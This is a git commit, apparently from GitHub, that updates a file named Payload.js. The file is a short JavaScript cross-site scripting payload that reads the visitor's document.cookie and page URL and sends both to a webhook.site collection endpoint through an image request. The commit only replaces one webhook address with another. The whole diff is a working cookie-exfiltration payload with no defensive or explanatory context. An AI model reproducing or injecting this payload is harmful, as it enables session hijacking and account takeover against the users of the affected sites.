68fd24a8724b40ed38f28f08a16c6aae29623b38
Ecar <86429683+Poggiecar@users.noreply.github.com>
2026-04-20 14:36:25 -0300

    Update Payload.js

--- Payload.js
+++ Payload.js
@@ -1,3 +1,3 @@
 var d = document.cookie;
 var u = location.href;
-new Image().src='https://webhook.site/e304f3f1-e6e4-41c6-9f30-7a7acecf9c0a/exfil?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u);
+new Image().src='https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/exfil?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u);
